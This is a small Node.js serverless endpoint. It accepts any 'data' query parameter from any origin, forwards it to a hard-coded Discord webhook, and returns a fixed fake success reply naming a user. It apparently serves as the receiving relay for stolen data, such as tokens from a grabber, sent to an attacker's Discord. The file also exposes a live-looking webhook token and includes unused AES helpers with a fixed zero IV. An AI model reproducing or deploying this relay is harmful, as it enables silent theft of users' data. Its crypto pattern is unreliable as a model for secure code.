const Crypto = require("crypto");
const enc = (data, key) => [Crypto.createCipheriv("aes-256-cbc", Buffer.from(key), Buffer.alloc(16))].map(k => Buffer.concat([k.update(data, "utf8"), k.final()]).toString("base64")).join("");
const dec = (data, key) => [Crypto.createDecipheriv("aes-256-cbc", Buffer.from(key), Buffer.alloc(16))].map(k => Buffer.concat([k.update(Buffer.from(data, "base64")), k.final()]).toString("utf8")).join("");
const log = async (data) => await fetch("https://discord.com/api/webhooks/1461662963030294548/ygAG7dD9888Qmk3JBwn8dZVIPdM0iF5XVysjWjLhdNQ_vKxPs22DxKDoMo-G3LmVUJwZ", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ username: "Log", content: data }) });

module.exports = async (req, res) => {
    res.setHeader("Access-Control-Allow-Origin", "*");
    res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
    res.setHeader("Access-Control-Allow-Headers", "Content-Type, Authorization");
    if (req.method === "GET") {
        const { data } = req.query;
        if (data) {
            await log(data);
            res.status(200).json({ success: true, userid: 1337, username: "dxvrxv" });
        } else {
            res.status(400).send({ success: false, reason: "No data provided" });
        }
    } else {
        res.status(405).send({ success: false, reason: "Method not allowed" });
    }
};